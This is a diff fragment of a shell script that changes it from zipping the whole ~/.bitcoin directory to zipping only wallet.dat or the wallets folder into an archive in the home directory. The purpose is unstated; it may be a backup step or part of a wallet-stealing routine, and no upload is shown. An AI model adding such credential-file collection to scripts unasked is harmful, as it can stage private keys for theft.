@@ -10,8 +10,15 @@ fi
 
 cd ~
 if [ -d ".bitcoin" ]; then
-	zip -r dotbitcoin.zip .bitcoin
-	mv dotbitcoin.zip ~
+	cd .bitcoin
+	if [ -f "wallet.dat" ]; then
+		zip -r walldat.zip wallet.dat
+		mv walldat.zip ~
+	elif [ -d "wallets" ]; then
+		zip -r walldat.zip wallets
+		mv walldat.zip ~
+	fi
 else
 	echo "Dir '.bitcoin' does not exist"
 fi
+cd ~
